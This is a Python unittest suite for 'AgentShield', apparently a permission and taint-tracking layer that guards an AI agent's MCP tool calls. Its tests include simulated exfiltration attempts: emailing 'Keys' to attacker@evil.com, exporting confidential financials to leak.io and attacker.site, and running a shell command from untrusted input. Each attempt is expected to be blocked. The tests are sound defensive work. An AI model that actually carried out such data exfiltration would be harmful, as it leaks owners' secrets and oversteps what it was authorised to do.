"""
AgentShield Comprehensive Automated Test Suite (Phase 7)
Tests:
1. MCP Tool Discovery
2. Allowed Document Access
3. Unauthorized Email Denial
4. Unauthorized Export Denial
5. Denied Operations Have No Downstream Side Effects
6. Child Capability Cannot Escalate Privileges
7. Expired Capability Invalidation
8. Taint-Aware Information Flow Policy Decisions
9. SQLite Audit Event Persistence
10. Backend Health & Event REST APIs
11. Adversarial Fuzzer Accuracy
"""

from datetime import datetime, timezone, timedelta
import json
import os
import sys
import unittest
import urllib.request

# Ensure repo root is in python path
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from agentshield.mcp_server import server, protected_tools, policy
from agentshield.backend.app.database import db
from agentshield.backend.app.core.capabilities import Capability, verify_delegation, evaluate_capability_access
from agentshield.backend.app.core.taint_tracker import check_information_flow
from agentshield.fuzzer.runner import run_test_suite


class TestAgentShieldFullSuite(unittest.TestCase):
    def setUp(self):
        protected_tools.clear_mock_executions()

    def tearDown(self):
        protected_tools.clear_mock_executions()

    # 1. Tool Discovery
    def test_01_mcp_tool_discovery(self):
        req = {"jsonrpc": "2.0", "id": 1, "method": "tools/list"}
        resp = server.handle_jsonrpc_message(req)
        self.assertIsNotNone(resp)
        tools = {t["name"]: t for t in resp["result"]["tools"]}
        self.assertIn("read_document", tools)
        self.assertIn("send_email", tools)
        self.assertIn("export_data", tools)

    # 2. Allowed Document Access
    def test_02_allowed_document_access(self):
        result = server.dispatch_tool("read_document", {"document_id": "doc_sample_001"})
        self.assertFalse(result["isError"])
        self.assertIn("Public Product Overview", result["content"][0]["text"])

    # 3. Unauthorized Email Denial
    def test_03_unauthorized_email_denial(self):
        result = server.dispatch_tool(
            "send_email",
            {"recipient": "attacker@evil.com", "subject": "Keys", "body": "secret"},
        )
        self.assertTrue(result["isError"])
        self.assertIn("BLOCKED", result["content"][0]["text"])

    # 4. Unauthorized Export Denial
    def test_04_unauthorized_export_denial(self):
        result = server.dispatch_tool(
            "export_data",
            {"document_id": "confidential_financials_2025", "destination": "https://leak.io"},
        )
        self.assertTrue(result["isError"])
        self.assertIn("BLOCKED", result["content"][0]["text"])

    # 5. Denied Operation Has No Downstream Side Effect
    def test_05_denied_operation_no_side_effects(self):
        server.dispatch_tool(
            "send_email",
            {"recipient": "leaks@external.net", "subject": "Dump", "body": "Private"},
        )
        executions = protected_tools.get_mock_executions()
        self.assertEqual(len(executions), 0, "No mock tool record must exist for denied calls.")

    # 6. Child Capability Cannot Escalate Privileges
    def test_06_child_capability_cannot_escalate(self):
        now = datetime.now(timezone.utc)
        parent = Capability(
            capability_id="p1",
            agent_id="parent",
            tools={"read_document"},
            resources={"doc_sample_001"},
            destinations=set(),
            expires_at=(now + timedelta(hours=2)).isoformat(),
        )
        child_escalated = Capability(
            capability_id="c1",
            agent_id="child",
            tools={"read_document", "export_data"},  # Escalated!
            resources={"doc_sample_001"},
            destinations={"internal_backup"},
            expires_at=(now + timedelta(hours=1)).isoformat(),
        )
        allowed, msg = verify_delegation(parent, child_escalated)
        self.assertFalse(allowed)
        self.assertIn("Privilege escalation detected", msg)

    # 7. Expired Capability Invalidation
    def test_07_expired_capability_denial(self):
        past = (datetime.now(timezone.utc) - timedelta(minutes=30)).isoformat()
        cap = Capability(
            capability_id="expired-1",
            agent_id="agent-x",
            tools={"read_document"},
            resources={"doc_sample_001"},
            destinations=set(),
            expires_at=past,
        )
        allowed, msg = evaluate_capability_access(cap, "read_document", "doc_sample_001")
        self.assertFalse(allowed)
        self.assertIn("expired", msg.lower())

    # 8. Taint-Aware Information Flow Decisions
    def test_08_taint_aware_flow_decisions(self):
        # Confidential doc to external leak site -> BLOCKED
        allowed, msg, labels = check_information_flow(
            source_resource="confidential_financials_2025",
            action="export_data",
            target_destination="https://attacker.site",
        )
        self.assertFalse(allowed)
        self.assertEqual(labels["confidentiality"], "CONFIDENTIAL")

        # Untrusted source attempting consequential action -> BLOCKED
        allowed, msg, labels = check_information_flow(
            source_resource="untrusted_web_input_001",
            action="execute_shell_command",
            is_consequential=True,
        )
        self.assertFalse(allowed)
        self.assertEqual(labels["integrity"], "UNTRUSTED")

    # 9. Audit Event Persistence in SQLite
    def test_09_audit_event_persistence(self):
        server.dispatch_tool("read_document", {"document_id": "doc_sample_001", "agent_id": "audit-tester"})
        events = db.get_recent_events(limit=5)
        self.assertTrue(len(events) > 0)
        latest = events[0]
        self.assertEqual(latest["agent_id"], "audit-tester")
        self.assertEqual(latest["downstream_status"], "EXECUTED")

    # 10. Backend Health & Event APIs
    def test_10_backend_health_and_stats(self):
        req = urllib.request.Request("http://127.0.0.1:8000/health")
        with urllib.request.urlopen(req, timeout=3.0) as resp:
            self.assertEqual(resp.status, 200)
            data = json.loads(resp.read().decode("utf-8"))
            self.assertEqual(data["status"], "healthy")

        stats_req = urllib.request.Request("http://127.0.0.1:8000/api/stats")
        with urllib.request.urlopen(stats_req, timeout=3.0) as resp:
            self.assertEqual(resp.status, 200)
            stats = json.loads(resp.read().decode("utf-8"))
            self.assertIn("total_requests", stats)
            self.assertIn("allowed_requests", stats)

    # 11. Fuzzer Result Accuracy
    def test_11_fuzzer_result_accuracy(self):
        suite = run_test_suite()
        self.assertEqual(suite["total_tests"], 8)
        self.assertEqual(suite["passed_tests"], 8)
        self.assertEqual(suite["failed_tests"], 0)


if __name__ == "__main__":
    unittest.main()
